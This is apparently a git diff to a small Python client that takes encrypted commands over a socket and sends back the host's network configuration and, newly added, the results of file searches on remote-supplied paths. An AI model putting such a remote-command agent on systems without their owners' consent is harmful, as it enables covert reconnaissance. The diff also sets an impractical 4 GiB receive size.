@@ -3,14 +3,18 @@ from sys import argv
 import socket
 import rsa
 from cryptography.fernet import Fernet
-MSGLEN=2048
+MSGLEN=4294967296
 from platform import system as find_system
-from subprocess import check_output
+from subprocess import check_output, DEVNULL, PIPE, run
 
 class Linux:
   def ipconfig(self):
     return check_output(["ip", "a"]).decode('utf-8')
-
+  
+  def search(self, filename, path):
+      return run(['find', path, '-name', filename], stderr=DEVNULL, stdout=PIPE).stdout.decode("utf-8").strip()
+    
+              
 class Windows:
   def ipconfig(self):
     return check_output(["ipconfig"]).decode('utf-8')
@@ -48,6 +52,9 @@ class SecureSocket:
     msg=self.sock.recv(MSGLEN)
     message=self.key.decrypt(msg).decode('utf-8')
     return message
+  
+  def get_params(self):
+    return self.receive().split(" ")
 
   def wait_for_cmd(self):
     using=True
@@ -55,8 +62,9 @@ class SecureSocket:
       match self.receive():
         case "ip":
           self.send(self.system.ipconfig())
-        case "ho":
-          print("ho")
+        case "search":
+          filename,path = self.get_params()
+          self.send(self.system.search(filename,path))
         case "exit":
           using=False
         case _:
